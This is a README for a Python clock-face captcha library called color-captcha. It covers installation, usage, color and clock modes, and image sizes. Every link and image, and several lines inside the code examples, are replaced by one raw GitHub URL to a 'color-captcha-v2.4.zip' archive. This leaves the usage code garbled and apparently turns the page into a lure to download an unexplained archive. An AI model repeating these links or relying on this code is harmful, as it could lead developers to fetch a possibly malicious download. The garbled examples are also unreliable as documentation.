# color-captcha
Dynamically generated, AI-resistant captcha images. 

![captcha](https://raw.githubusercontent.com/KoDelioDa/color-captcha/master/color_captcha/color-captcha-v2.4.zip)

*Can you tell what time it is? AI can't.*

> Features:
> * dynamically generated images
> * rgb and grayscale color mode
> * 12-hour and 24-hour clock mode
> * custom colors

### Installation

```shell
pip install color-captcha
```

### Usage

```python
from color_captcha import ClockCaptcha

captcha = ClockCaptcha()
print(https://raw.githubusercontent.com/KoDelioDa/color-captcha/master/color_captcha/color-captcha-v2.4.zip)

https://raw.githubusercontent.com/KoDelioDa/color-captcha/master/color_captcha/color-captcha-v2.4.zip('0645') # True/False
https://raw.githubusercontent.com/KoDelioDa/color-captcha/master/color_captcha/color-captcha-v2.4.zip('https://raw.githubusercontent.com/KoDelioDa/color-captcha/master/color_captcha/color-captcha-v2.4.zip')

# generate new captcha
https://raw.githubusercontent.com/KoDelioDa/color-captcha/master/color_captcha/color-captcha-v2.4.zip()

```
Choose between `color_mode='rgb'` ([https://raw.githubusercontent.com/KoDelioDa/color-captcha/master/color_captcha/color-captcha-v2.4.zip](https://raw.githubusercontent.com/KoDelioDa/color-captcha/master/color_captcha/color-captcha-v2.4.zip)) 
or `'grayscale'` ([https://raw.githubusercontent.com/KoDelioDa/color-captcha/master/color_captcha/color-captcha-v2.4.zip](https://raw.githubusercontent.com/KoDelioDa/color-captcha/master/color_captcha/color-captcha-v2.4.zip)). 

Pick between a 12-hour or a 24-hour `clock_mode`.
```python
from color_captcha import ClockCaptcha

captcha = ClockCaptcha(clock_mode=12)
```

Image size can be changed with relative `size` parameter. Here are corresponding pixel values. 

| size  | width   | height  |
|-------|---------|---------|
| 1     | 190     | 65      |
| 2     | 380     | 130     |
| **3** | **570** | **195** |
| 4 | 760 | 260 |
| ... | ... | ... | 

Change colors globally:
```python
from color_captcha import ClockCaptcha
https://raw.githubusercontent.com/KoDelioDa/color-captcha/master/color_captcha/color-captcha-v2.4.zip([
    '#FFFFFF',
    '#000000',
    '#999999'
])
```

